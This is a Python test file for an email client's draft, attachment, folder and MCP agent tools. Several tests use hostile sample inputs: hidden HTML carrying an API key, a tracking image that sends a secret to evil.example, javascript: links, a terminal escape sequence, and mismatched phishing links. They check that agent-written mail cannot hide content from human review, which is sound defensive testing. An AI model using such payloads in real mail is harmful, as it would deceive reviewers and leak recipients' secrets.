"""Draft editing, inline images vs attachments, folder ops, and the MCP surface for them."""

import pytest
from mcp import Client

from monospace.core import compose, policy
from monospace.core.compose import Draft
from monospace.core.service import ServiceError
from monospace.mcp_server import build_server
from tests.fakes import make_raw, parse
from tests.test_mcp import _data

PNG = b"\x89PNG\r\n\x1a\n" + b"\0" * 16


@pytest.fixture
def agent_dir(svc):
    d = policy.agent_attachment_dir(svc.cfg.settings.agent_attachment_dir)
    (d / "logo.png").write_bytes(PNG)
    (d / "terms.pdf").write_bytes(b"%PDF-1")
    return d


def _parts(raw: bytes) -> dict:
    msg = parse(raw)
    out = {"inline": [], "attach": [], "html": ""}
    for p in msg.walk():
        if p.is_multipart():
            continue
        if p.get_content_type() == "text/html":
            out["html"] = p.get_content()
        elif p.get("content-id"):
            out["inline"].append((p.get("content-id"), p.get_content_disposition()))
        elif p.get_content_disposition() == "attachment":
            out["attach"].append(p.get_filename())
    return out


def _drafts(server):
    return [m["raw"] for m in server.folders["Drafts"]["msgs"].values()]


def test_inline_vs_attachment_structure(agent_dir):
    d = Draft(to=["a@b.c"], subject="s", body="Hi\n\n![Acme](logo.png)",
              attachments=[str(agent_dir / "terms.pdf")])
    compose.add_inline(d, str(agent_dir / "logo.png"), {"width": 120})
    msg = compose.build(d, "me@example.com")
    assert msg.get_content_type() == "multipart/mixed"
    parts = _parts(msg.as_bytes())
    assert parts["inline"] == [("<logo.png@monospace.email>", "inline")]
    assert parts["attach"] == ["terms.pdf"]
    assert 'src="cid:logo.png@monospace.email"' in parts["html"]
    assert "[Acme]" in msg.get_body(("plain",)).get_content()


def test_unreferenced_inline_is_placed_top(agent_dir):
    d = Draft(to=["a@b.c"], subject="s", body="Body text")
    compose.add_inline(d, str(agent_dir / "logo.png"), {"position": "top", "width": 80, "link": "https://acme.io"})
    html = _parts(compose.build(d, "me@example.com").as_bytes())["html"]
    assert html.index("cid:logo.png@monospace.email") < html.index("Body text")
    assert 'width="80"' in html and 'href="https://acme.io"' in html


def test_ai_inline_image_outside_agent_dir_refused(svc, tmp_path):
    (tmp_path / "secret.png").write_bytes(PNG)
    d = Draft(to=["a@b.c"], subject="s", body="x")
    compose.add_inline(d, str(tmp_path / "secret.png"))
    with pytest.raises(policy.AttachmentPolicyError):
        svc.save_draft(None, d, "ai")


def test_add_logo_to_existing_drafts_keeps_content(svc, server, agent_dir):
    svc.sync(None, ["drafts"])
    first = svc.save_draft(None, Draft(to=["x@y.com"], bcc=["z@y.com"], subject="Q4", body="Numbers **up**",
                                       attachments=[str(agent_dir / "terms.pdf")]), "ai")
    assert first.draft_id
    res = svc.update_draft(first.draft_id, source="ai",
                           add_inline_images=[{"path": "logo.png", "width": 120, "position": "top"}])
    assert res.status == "drafted" and res.draft_id
    raws = _drafts(server)
    assert len(raws) == 1  # old version expunged
    parts = _parts(raws[0])
    assert parts["attach"] == ["terms.pdf"] and len(parts["inline"]) == 1
    assert "<strong>up</strong>" in parts["html"]
    got = svc.get_draft(res.draft_id)
    assert got["bcc"] == ["z@y.com"] and got["subject"] == "Q4"
    assert [i["filename"] for i in got["inline_images"]] == ["logo.png"]
    # Edit the subject only: logo, attachment and HTML survive; then drop the logo cleanly.
    res2 = svc.update_draft(res.draft_id, subject="Q4 final")
    res3 = svc.update_draft(res2.draft_id, remove_inline_images=["logo.png"])
    parts = _parts(_drafts(server)[0])
    assert parts["inline"] == [] and "cid:" not in parts["html"] and parts["attach"] == ["terms.pdf"]
    assert svc.get_draft(res3.draft_id)["subject"] == "Q4 final"


def test_draft_ops_refuse_non_drafts(svc):
    svc.sync()
    inbox_id = svc.list()[0].id
    for op in (svc.get_draft, svc.delete_draft, lambda i: svc.update_draft(i, subject="x")):
        with pytest.raises(ServiceError, match="not the Drafts folder"):
            op(inbox_id)


def test_send_draft_follows_policy(svc, server, sent, agent_dir):
    d = Draft(to=["x@y.com"], subject="hi", body="b")
    compose.add_inline(d, str(agent_dir / "logo.png"))
    did = svc.save_draft(None, d, "ai").draft_id
    assert svc.send_draft(did, "ai").status == "drafted" and sent == []  # ai_send=draft default
    svc.account().ai_send = "confirm"
    res = svc.send_draft(did, "ai")
    assert res.status == "queued" and len(_drafts(server)) == 1
    svc.outbox_cancel(res.outbox_id)
    assert svc.outbox() == []
    svc.account().ai_send = "allow"
    assert svc.send_draft(did, "ai").status == "sent"
    assert _drafts(server) == [] and len(_parts(sent[0][0].as_bytes())["inline"]) == 1


def test_forward_includes_original_attachments(svc, sent):
    svc.sync()
    invoice = next(e for e in svc.list() if e.subject == "Invoice")
    svc.account().ai_send = "allow"
    svc.forward(invoice.id, "fyi", ["x@y.com"], source="ai", include_attachments=True)
    assert _parts(sent[0][0].as_bytes())["attach"] == ["inv.pdf"]


def test_folder_ops(svc, server):
    svc.sync()
    assert any(f["name"] == "Projects" for f in svc.create_folder(None, "Projects"))
    svc.rename_folder(None, "Projects", "Clients")
    assert "Clients" in server.folders and "Projects" not in server.folders
    with pytest.raises(ServiceError, match="system folder"):
        svc.delete_folder(None, "Sent")
    server.deliver("Clients", make_raw("x"))
    with pytest.raises(ServiceError, match="move them out"):
        svc.delete_folder(None, "Clients")
    server.folders["Clients"]["msgs"].clear()
    assert all(f["name"] != "Clients" for f in svc.delete_folder(None, "Clients"))


async def test_mcp_draft_round_trip(svc, server, agent_dir):
    async with Client(build_server(lambda: svc)) as client:
        names = {t.name for t in (await client.list_tools()).tools}
        assert {"get_draft", "update_draft", "delete_draft", "send_draft", "outbox_cancel"} <= names
        assert not any("approve" in n for n in names)
        made = _data(await client.call_tool("create_draft", {
            "to": ["x@y.com"], "subject": "s", "body": "hello", "attachments": ["terms.pdf"]}))
        upd = _data(await client.call_tool("update_draft", {
            "id": made["draft_id"], "add_inline_images": [{"path": "logo.png", "width": 100}]}))
        got = _data(await client.call_tool("get_draft", {"id": upd["draft_id"]}))
        assert [a["filename"] for a in got["attachments"]] == ["terms.pdf"]
        assert [i["filename"] for i in got["inline_images"]] == ["logo.png"]
        assert 'width="100"' in got["html"]
        await client.call_tool("delete_draft", {"id": upd["draft_id"]})
    assert _drafts(server) == []


def test_ai_html_cannot_hide_content_from_review(svc):
    """An agent's html_body must be what the human reviews in the outbox, not a decoy body."""
    svc.account().ai_send = "confirm"
    d = Draft(to=["x@y.com"], subject="s", body="Quarterly numbers attached.",
              html_body='<p>Quarterly numbers.</p><div style="display:none">API_KEY=sk-123</div>')
    item = svc.store.outbox_get(svc.submit(None, d, "ai").outbox_id)
    assert "sk" in item["draft"]["body"] and "123" in item["draft"]["body"]


def test_html_matches_text_is_ordered():
    from monospace.core.sanitize import html_matches_text

    assert html_matches_text("<p>Hello <b>world</b></p>", "Hello **world**")
    assert not html_matches_text("<p>Hello</p><span hidden>secret</span>", "Hello")
    assert not html_matches_text("<p>do not pay</p>", "pay do not")  # same words, other meaning


def test_agent_html_is_sanitized_when_sent(svc, sent):
    svc.account().ai_send = "allow"
    html = ('<style>p:after{content:"PAY"}</style><p style="color:white">hi</p>'
            '<img src="https://evil.example/?k=secret"><!--[if mso]>OUTLOOK ONLY<![endif]-->'
            '<a href="javascript:x()">js</a><a href="https://ok.example">Docs</a>')
    svc.submit(None, Draft(to=["x@y.com"], subject="s", body="decoy", html_body=html), "ai")
    sent_html = _parts(sent[0][0].as_bytes())["html"]
    for bad in ("<style", "color:white", "evil.example", "OUTLOOK", "javascript:"):
        assert bad not in sent_html
    assert 'href="https://ok.example"' in sent_html
    plain = sent[0][0].get_body(("plain",)).get_content()
    assert "decoy" not in plain and "<https://ok.example>" in plain


def test_markdown_raw_html_from_agent_is_sanitized(svc, sent):
    svc.account().ai_send = "allow"
    svc.submit(None, Draft(to=["x@y.com"], subject="s",
                           body='Hi <div style="display:none">hidden</div> <img src="https://t.example/p.gif">'), "ai")
    sent_html = _parts(sent[0][0].as_bytes())["html"]
    assert "display:none" not in sent_html and "t.example" not in sent_html and "hidden" in sent_html


def test_outbox_review_shows_sent_content_and_strips_escapes(svc):
    svc.account().ai_send = "confirm"
    res = svc.submit(None, Draft(to=["x@y.com"], subject="s", body="ok \x1b]52;c;ZXZpbA==\x07 there "
                                 "[click](https://evil.example)"), "ai")
    text = svc.outbox_review(svc.store.outbox_get(res.outbox_id))
    assert "\x1b" not in text and "\x07" not in text and "<https://evil.example>" in text


def test_sanitizer_is_stable_and_drops_comments_in_dom():
    from monospace.core.sanitize import html_matches_text, sanitize_html

    html = '<p>a<!--[if mso]>X<![endif]--><a href="https://a/<!--">b</a> c --></p><a href="https://ok.io/x y">s</a>'
    out = sanitize_html(html)
    assert "X" not in out and "<!--" not in out and "ok.io" not in out
    assert sanitize_html(out) == out
    # link target must be visible in the text part
    assert not html_matches_text('<a href="https://evil.example">invoice</a>', "invoice")
    assert html_matches_text('<a href="https://ok.example">docs</a>', "[docs](https://ok.example)")


def test_link_targets_compared_as_urls():
    from monospace.core.sanitize import html_matches_text, sanitize_html

    # same words, different host
    assert not html_matches_text('<a href="https://ok.example.evil.com">docs</a>', "[docs](https://ok.example/evil.com)")
    assert not html_matches_text('<a href="https://evil.com">docs</a>', "docs")
    assert html_matches_text('<p>See <a href="https://OK.example/a">docs</a>.</p>', "See [docs](https://ok.example/a).")
    assert "href" not in sanitize_html('<a href="https://ok.example@evil.com">x</a>')  # userinfo dropped
    assert "<!--" not in sanitize_html('<img src="cid:a" alt="x<!--y--></p><script>">')


def test_visible_url_in_html_still_matches():
    from monospace.core.sanitize import html_matches_text

    assert html_matches_text('<p>Go to <a href="https://a.io/x">https://a.io/x</a></p>', "Go to <https://a.io/x>")


def test_links_compared_in_position_and_attributes_ignored():
    from monospace.core.sanitize import html_matches_text, review_text

    # link moved to a different spot in the text
    assert not html_matches_text('<p><a href="https://a.io">pay</a> later</p>', "pay later [x](https://a.io)")
    # visible URL text, different destination
    assert not html_matches_text('<a href="https://evil.io">https://bank.io</a>', "<https://bank.io>")
    # attribute content never counts as visible text
    assert html_matches_text('<p align="x>secret">Hi</p>', "Hi")
    assert "secret" not in review_text('<p align="x>secret">Hi</p><img src="cid:a" alt="logo">')


def test_sanitize_review_hardening():
    from monospace.core.sanitize import html_matches_text, review_text

    # URL embedded in link text that differs from the target
    assert not html_matches_text('<a href="https://evil.io">see https://bank.io now</a>',
                                 "see https://bank.io now <https://evil.io>")
    # unnormalizable URLs never match each other
    assert not html_matches_text("<p>http://a:99999/</p>", "http://b:99999/")
    # deep nesting: no RecursionError
    deep = "<span>" * 5000 + "hi" + "</span>" * 5000
    assert "hi" in review_text(deep) and html_matches_text(deep, "hi")
